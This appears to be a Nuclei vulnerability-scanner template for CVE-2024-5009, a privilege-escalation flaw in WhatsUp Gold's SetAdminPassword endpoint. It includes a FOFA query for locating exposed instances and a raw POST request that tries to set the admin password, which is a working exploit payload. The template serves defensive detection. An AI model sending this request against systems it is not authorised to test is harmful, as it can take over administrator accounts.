id: CVE-2024-5009

info:
  name: WhatsUp Gold SetAdminPassword - Privilege Escalation
  author: DhiyaneshDk
  severity: high
  description: |
    In WhatsUp Gold versions released before 2023.1.3, an Improper Access Control vulnerability in Wug.UI.Controllers.InstallController.SetAdminPassword allows local attackers to modify admin's password.
  reference:
    - https://summoning.team/blog/progress-whatsup-gold-privesc-setadminpassword-cve-2024-5009/
    - https://x.com/SinSinology/status/1810289238212034784
    - https://github.com/sinsinology/CVE-2024-5009
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="WhatsUp Gold" && icon_hash="-2107233094"
  tags: cve,cve2024,progress,whatsup-gold

variables:
  password: "{{rand_base(8)}}"
  confirmpassword: "{{rand_base(8)}}"

http:
  - raw:
      - |
        POST /NmConsole/Wug/Install/SetAdminPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        Password={{password}}&ConfirmPassword={{confirmpassword}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
